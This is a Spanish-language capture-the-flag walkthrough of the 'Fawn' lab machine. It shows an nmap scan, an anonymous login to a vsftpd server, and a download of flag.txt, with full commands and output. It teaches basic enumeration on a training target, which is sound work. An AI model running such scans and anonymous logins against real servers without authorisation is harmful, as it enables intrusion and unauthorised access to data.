
## Escaneo de Puertos:

Comenzamos usando "**nmap**" para escanear los puertos abiertos a ver que nos encontramos.
```bash
[16:29:38] bapee@BlumeSec ~/Escritorio/fawn ❯ nmap -sVC -p- --open 10.129.10.186

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.14.220
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
Service Info: OS: Unix
```

Vemos que tenemos el puerto **21/FTP (File Transfer Protocol)** abierto, con el 
**"Anonymous FTP login allowed"** y con un archivo dentro llamado "**flag.txt**"

#### Que es Anonymous FTP login?

Básicamente cuando en un servicio FTP esta el **"Anonymous FTP login allowed"** significa que podemos acceder a el identificándonos con un usuario llamado Anonymous y sin contraseña, por lo que podremos leer los archivos que se encuentren dentro.

## Acceso al servicio FTP:

Nos vamos a conectar utilizando el siguiente comando **"ftp (IP)"** y nos pedirá que nos identifiquemos.
```bash
[16:30:05] bapee@BlumeSec ~/Escritorio/fawn ❯ ftp 10.129.10.186
Connected to 10.129.10.186.
220 (vsFTPd 3.0.3)
Name (10.129.10.186:bapee): Anonymous
331 Please specify the password.
Password: 
230 Login successful. "<-- Esto nos indica que hemos entrado correctamente" 
Remote system type is UNIX.
Using binary mode to transfer files.
```

Una vez estamos dentro la manera de movernos no cambia mucho, pero es importante ver alguna diferencia.

Empezamos listando los archivos.
```bash
ftp> dir
229 Entering Extended Passive Mode (|||16593|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt
226 Directory send OK.
ftp> ls
229 Entering Extended Passive Mode (|||53200|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt
226 Directory send OK.
```
Vemos que funciona tanto con "**dir**" como con "**ls**".

Ahora vamos a usar el comando **"get"** para poder enviar el archivo desde el servicio FTP a nuestro directorio actual.
```bash
ftp> get flag.txt
local: flag.txt remote: flag.txt
229 Entering Extended Passive Mode (|||8229|)
150 Opening BINARY mode data connection for flag.txt (32 bytes).
100% |************************************************************************************|    32       49.52 KiB/s    00:00 ETA
226 Transfer complete.
32 bytes received in 00:00 (0.76 KiB/s)
```

Con **"exit"** volveremos a nuestro directorio y ya podremos leer la **flag.txt** .
```bash
ftp> exit
221 Goodbye.
[16:46:48] bapee@BlumeSec ~/Escritorio/fawn ❯ ls
flag.txt
[16:46:50] bapee@BlumeSec ~/Escritorio/fawn ❯ cat flag.txt 
035db21c-----------0536e44f815 
```

Y asi quedaría vulnerada la maquina "**Fawn**".

## Resumen del Ataque

1. Se realiza un escaneo con **Nmap** y se detecta el puerto **21/FTP** abierto, observando además que el servidor permite acceso mediante **Anonymous FTP Login**.
2. Se accede al servicio FTP utilizando el usuario `anonymous` sin contraseña y se enumeran los archivos disponibles en el servidor.
3. Se descarga el archivo `flag.txt` mediante el comando `get` y posteriormente se visualiza su contenido desde el sistema local.